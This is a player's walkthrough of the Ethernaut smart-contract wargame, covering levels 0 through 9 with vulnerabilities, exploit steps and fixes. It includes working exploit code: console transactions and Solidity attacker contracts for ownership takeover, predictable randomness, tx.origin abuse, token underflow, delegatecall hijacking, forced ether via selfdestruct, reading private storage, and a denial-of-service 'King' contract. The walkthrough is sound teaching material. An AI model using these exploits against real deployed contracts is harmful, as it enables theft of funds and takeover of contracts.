# The Ethernaut Review And Solutions
## Solutions for OpenZeppelin Solidity Warbase game - Etherenaut
# Introduction
The Ethernaut is a Web3/Solidity-based wargame inspired by overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be “hacked.”

I’m creating this review for each level of the ethernaut game as I play.

I will introduce each level of the game, their vulnerability, how an attacker can exploit them, and any recommendations I have in an orderly manner.

Each review has the following structure:
- Description
- The Vulnerability
- How it can be exploited
- My Recommendation(s)

Enjoy(;

## Level Zero - Hello Ethernaut:
This level aims to familiarize yourself with interacting with and playing the ethernaut game through the developer console. It would be best if you went through this level yourself. 
Hint: type `await contract.info()` and `await contract.password()` in your console.

## Level One - Fallback:
The goal of this level is to become the contract’s owner and reduce the contract balance to zero.

#### The Vulnerability
This level's contract allows an attacker to contribute by sending ether and exploit it by becoming the contract's owner through the “receive” function, allowing them to withdraw all ether stored in the contract.

#### How it can be exploited
An attacker can contribute to the contract by calling the "contribute" function while sending less than 0.001 ether, but they do not have owner or admin rights to withdraw the contract's ether balance.

```javascript
await contract.contribute({ from: player, value: toWei('0.0005')}
```
However, this restriction can be avoided if the attacker who has previously contributed sends ether again, but this time without using the contract's "contribute" function and instead sends ether directly.

```javascript
// in your console, send ether to the contract
// without using the contribute function
await contract.sendTransaction({ from: player, value: toWei('0.0003')
//verify the new owner
await contract.owner() == player; //returns true
```

When this happens, the contract's "receive" function is triggered, which makes the attackers address the new contract owner, allowing them to have admin rights and withdraw the contract's ether balance.

#### My Recommendation(s)
Remove the logic inside the “receive” function that sets “msg.sender” to the new contract owner based on predefined conditions.

## Level Two - Fallout:
This level can be hacked by becoming the contract owner.

#### The Vulnerability
The constructor is just a misspelled public function `fal1out()` that can be called anyone and came ownership of the contract.

#### How it can be exploited
Call the `Fal1out()` function in the console.

```javascript
await contract.Fal1out()
```

#### My Recommendation(s)
Up until solidity version `0.4`, a constructor can be defined by the same name as its contract name. However, this is no longer supported in recent versions, and all constructors should be named with the `constructor` keyword. When using recent versions of solidity, ensure to use the `constructor` keyword.

## Level Three - Coin Flip:
You must make a correct boolean guess ten times to hack this level.

#### The Vulnerability
The contract uses `block.number` and `blockhash` as a source of randomness, which is not secure since they are deterministic.

#### How it can be exploited
Create an attacking contract that calls the "CoinFlip" contract with the same logic.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external  returns (bool);
}

contract CoinFlipAttacker {
  ICoinFlip public CoinFlip;

  constructor(address _CoinFlip) {
      CoinFlip =  ICoinFlip(_CoinFlip);
  }


 // call this function ten times, in different blocks
  function attack() external {
  // simulate the same thing the "CoinFlip" contract does and call the contract with your value.
  // since both logic are the same, the values will be the same
      
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool side = coinFlip == 1 ? true : false;
  
    CoinFlip.flip(side);
  }

}

```
After calling the "attack" function ten times, verify you cracked the challenge by calling:
```javascript
await contract.consecutiveWins().then(answer => answer.toString()) // returns 10
```
#### My Recommendation(s)
Avoid using `block.number` and `blockhash` as a source of randomness. Instead, use oracles like Chainlink for secure random number generation.

## Level Four - Telephone:
The goal is to become the contract owner.

#### The Vulnerability
There is a misuse of `tx.origin` and `msg.sender` in the "Telephone" contract.

#### How it can be exploited
Call the "Telephone" contract with a smart contract while passing your address as an argument.
Like this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone{
    function changeOwner(address owner) external;
}
contract TelephoneAttacker{
    ITelephone Telephone;

    constructor(address _telephone) {
        Telephone = ITelephone(_telephone);
    }

    function attack() external {
        Telephone.changeOwner(tx.origin);// "tx.origin" will use the address of whoever calls the function
    }
}
```
#### My Recommendation(s)
When using `tx.origin`, ensure you know what you are doing. If an access control system must be implemented, use `require(msg.sender == owner);`.

## Level Five - Token:
The goal of this level is for you to hack the basic token contract and increase your balance to a large number.

#### The Vulnerability
The contract uses solidity version `0.6.0`, prone to an underflow/overflow error.

#### How it can be exploited
After creating an instance, the player's address has a balance of “20” tokens.

Since the contract checks, if a user's balance exceeds zero before making a transfer, we can transfer the "21" token to any address other than the player's. This will cause an underflow because `20 - 21 = 2^256-1` (underflow error in older solidity versions).

Paste this in your browser console: 

```javascript
await contract.transfer("0x4924fb92285cb10bc440e6fb4a53c2b94f2930c5",21) // you can substitute the address with your desired address
```
#### My Recommendation(s)
When using older solidity versions, use the OpenZeppelin SafeMath library for simple arithmetics; it has a check against integer overflow and underflow. 

## Level Six - Delegation:
The goal of this level is to become the contract owner.

#### The Vulnerability
The "Delegation" contract makes a delegate call to the "Delegate" contract; this call executes whatever function is being called but in the context of the "Delegation" contract (see [delegate call](https://docs.soliditylang.org/en/v0.8.6/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries)).

#### How it can be exploited
1. Encode the "pwn()" function in your console:

```javascript
encodedFunction = web3.eth.abi.encodeFunctionSignature("pwn()")
```

2. Call the encoded function on the "Delegation" contract. This triggers the fallback function, which makes the delegate call.

```javascript
await contract.sendTransaction({from: player, data: encodedFunction})
```

#### My Recommendation(s)
Remove the "delegate call" and use the "call" function when making an ordinary external contract call.

## Level Seven - Force:
We must force the contract balance to be greater than zero to pass this level.

#### The Vulnerability
The "Force" contract is empty, so it cannot accept Ether or execute any transaction. However, with the `selfdestruct()` function, we can force send Ether to any address, including an empty contract.

#### How it can be exploited

- Create a contract to exploit it:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

// attack contract
contract AttackForceContract{
    Force force;

    constructor(address _force) payable {
        force = Force(_force);
    }

//self destruct the contract and force ether transfer to the force contract
    function attack() external {
        selfdestruct(payable(address(force)));
    }

    receive() external payable {}
}
```
- Deploy the "AttackForceContract" contract and send Ether to it through the payable constructor.
- Call the "attack" function.
- Verify that the "Force" contract now has a balance greater than zero:

```javascript
await getBalance(instance)// returns the balance of the contract's instance
```
#### My Recommendation(s)
There is no way to block Ether sent through a `selfdestruct` in Ethereum.

## Level Eight - Vault:
This level aims to set the "locked" value to false.

#### The Vulnerability
The contract stores the password to unlock it as a private `bytes32` variable. However, even private variables can be read since the blockchain is a public ledger.

#### How it can be exploited
Run the following commands:

- Get the private password:

```javascript
await web3.eth.getStorageAt(instance,1) // returns 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```
- Call the unlock function:

```javascript
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```
- Verify that the contract is not locked again
```javascript
await contract.locked() // returns false
```
#### My Recommendation(s)
Never store imortant informations on-chain.


## Level 9


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}


contract AttackTheKing {
    King kingContract;

    constructor(address payable  _kingContract) {
        kingContract =  King(_kingContract);
    }

    function attack() external payable  {
        require(msg.value == 1 ether);
       (bool success,) = address(kingContract).call{value: msg.value}("");
       require(success);
    }


    receive() external payable {
        revert("Not leaving my throne!!!");
    }
}
```
